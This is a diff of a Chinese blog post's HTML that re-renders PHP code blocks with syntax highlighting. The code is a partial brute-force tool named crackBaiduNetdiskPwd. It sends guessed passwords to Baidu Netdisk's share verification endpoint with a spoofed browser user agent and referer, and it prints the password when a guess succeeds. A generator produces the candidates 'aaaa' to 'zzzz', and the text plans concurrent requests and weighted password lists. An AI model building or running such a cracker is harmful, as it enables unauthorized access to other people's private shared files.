@@ -352,56 +352,7 @@
 <li>post 方式发送的密码</li>
 </ol>
 <p>于是，我们有了以下的一段代码：</p>
-<pre><code class="php">&lt;?php
-function crackBaiduNetdiskPwd($url)
-{
-    $shareCode = ltrim(strstr($url, &#39;/1&#39;),&#39;/1&#39;);
-    $baseUrl = &#39;https://pan.baidu.com/share/verify?&#39;;
-    $get_params = [
-        &#39;surl&#39; =&gt; $shareCode,
-        &#39;t&#39; =&gt; intval(microtime(true) * 1000),
-        &#39;channel&#39; =&gt; &#39;chunlei&#39;,
-        &#39;web&#39; =&gt; 1,
-        &#39;clienttype&#39; =&gt; 0,
-        &#39;app_id&#39; =&gt; 123456,
-        &#39;bdstoken&#39; =&gt; &#39;&#39;,
-        &#39;logid&#39; =&gt; &#39;MTU2Njc5MTgzODkyNzAuNjM3NzgzODMwMzQ1MjE3NQ==&#39;
-    ];
-
-    $requestUrl = $baseUrl.http_build_query($get_params);
-
-    $pwd = &#39;77wk&#39;;//todo 生成密码
-    $post_params = [
-        &#39;pwd&#39; =&gt; $pwd,
-        &#39;vscode&#39; =&gt; &#39;&#39;,
-        &#39;vscode_str&#39; =&gt; &#39;&#39;
-    ];
-
-    $ch = curl_init($requestUrl);
-    curl_setopt_array(
-        $ch,
-        [
-            CURLOPT_POST =&gt; true,
-            CURLOPT_POSTFIELDS =&gt; http_build_query($post_params),//设定 POST 参数内容
-            // CURLOPT_FOLLOWLOCATION =&gt; true,//跟随重定向地址
-            // CURLOPT_AUTOREFERER =&gt; true,
-            CURLOPT_RETURNTRANSFER =&gt; true,//将curl_exec()获取的信息以字符串返回，而不是直接输出。
-            CURLOPT_USERAGENT =&gt; &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39;,
-            CURLOPT_REFERER =&gt; &#39;https://pan.baidu.com/share/init?surl=&#39;.$shareCode//必填项
-        ]
-    );
-    //todo 并发请求
-    $response = curl_exec($ch);
-
-    if(! json_decode($response)-&gt;errno) {
-        echo &#39;破解成功，密码为：&#39;.$pwd;
-    }
-
-    curl_close($ch);
-}
-
-crackBaiduNetdiskPwd(&#39;https://pan.baidu.com/s/1gftmNyb&#39;);
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crackBaiduNetdiskPwd</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $shareCode = ltrim(strstr($url, <span class="string">'/1'</span>),<span class="string">'/1'</span>);</span><br><span class="line">    $baseUrl = <span class="string">'https://pan.baidu.com/share/verify?'</span>;</span><br><span class="line">    $get_params = [</span><br><span class="line">        <span class="string">'surl'</span> =&gt; $shareCode,</span><br><span class="line">        <span class="string">'t'</span> =&gt; intval(microtime(<span class="keyword">true</span>) * <span class="number">1000</span>),</span><br><span class="line">        <span class="string">'channel'</span> =&gt; <span class="string">'chunlei'</span>,</span><br><span class="line">        <span class="string">'web'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'clienttype'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'app_id'</span> =&gt; <span class="number">123456</span>,</span><br><span class="line">        <span class="string">'bdstoken'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'logid'</span> =&gt; <span class="string">'MTU2Njc5MTgzODkyNzAuNjM3NzgzODMwMzQ1MjE3NQ=='</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $requestUrl = $baseUrl.http_build_query($get_params);</span><br><span class="line"></span><br><span class="line">    $pwd = <span class="string">'77wk'</span>;<span class="comment">//todo 生成密码</span></span><br><span class="line">    $post_params = [</span><br><span class="line">        <span class="string">'pwd'</span> =&gt; $pwd,</span><br><span class="line">        <span class="string">'vscode'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'vscode_str'</span> =&gt; <span class="string">''</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $ch = curl_init($requestUrl);</span><br><span class="line">    curl_setopt_array(</span><br><span class="line">        $ch,</span><br><span class="line">        [</span><br><span class="line">            CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_POSTFIELDS =&gt; http_build_query($post_params),<span class="comment">//设定 POST 参数内容</span></span><br><span class="line">            <span class="comment">// CURLOPT_FOLLOWLOCATION =&gt; true,//跟随重定向地址</span></span><br><span class="line">            <span class="comment">// CURLOPT_AUTOREFERER =&gt; true,</span></span><br><span class="line">            CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,<span class="comment">//将curl_exec()获取的信息以字符串返回，而不是直接输出。</span></span><br><span class="line">            CURLOPT_USERAGENT =&gt; <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span>,</span><br><span class="line">            CURLOPT_REFERER =&gt; <span class="string">'https://pan.baidu.com/share/init?surl='</span>.$shareCode<span class="comment">//必填项</span></span><br><span class="line">        ]</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//todo 并发请求</span></span><br><span class="line">    $response = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(! json_decode($response)-&gt;errno) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'破解成功，密码为：'</span>.$pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">crackBaiduNetdiskPwd(<span class="string">'https://pan.baidu.com/s/1gftmNyb'</span>);</span><br></pre></td></tr></table></figure>
 <p>至此，单次请求已经成功，但剩余的工作还有：</p>
 <ol>
 <li>我们需要生成纯字母、字母数字、纯数字三种类型的密码，且这三类的权重依次降低，三类中的重复密码（如：<code>aaaa</code>，<code>6666</code>）权重最低</li>
@@ -412,30 +363,8 @@ crackBaiduNetdiskPwd(&#39;https://pan.baidu.com/s/1gftmNyb&#39;);
 <li>记录每次破解的耗时与次数，用于后期分析</li>
 </ol>
 <p>—2019-09-19更新—</p>
-<p>生成<code>aaaa ~ zzzz</code>的密码：</p>
-<pre><code class="php">function getAlphabet() {
-    for ($i = &#39;aaaa&#39;; $i &lt; &#39;zzzz&#39;; $i++) {
-        yield $i;
-
-        if (&#39;zzzy&#39; === $i) {
-            return yield get4Z();
-        }
-    }
-}
-
-function get4Z() {
-    return &#39;zzzz&#39;;
-}
-
-foreach (getAlphabet() as $letter) {
-    echo $letter;
-}
-</code></pre>
-<p>生成字母数字的密码：</p>
-<pre><code class="php">function getAlphanumeric() {
-    //todo 
-}
-</code></pre>
+<p>生成<code>aaaa ~ zzzz</code>的密码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphabet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="string">'aaaa'</span>; $i &lt; <span class="string">'zzzz'</span>; $i++) &#123;</span><br><span class="line">        <span class="keyword">yield</span> $i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'zzzy'</span> === $i) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">yield</span> get4Z();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get4Z</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'zzzz'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (getAlphabet() <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>生成字母数字的密码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphanumeric</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//todo </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <hr>
 <h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ol>
 <li>如果需要获取更高精度的时间戳，可以调整<code>php.ini</code>中的<code>precision</code>的值。</li>
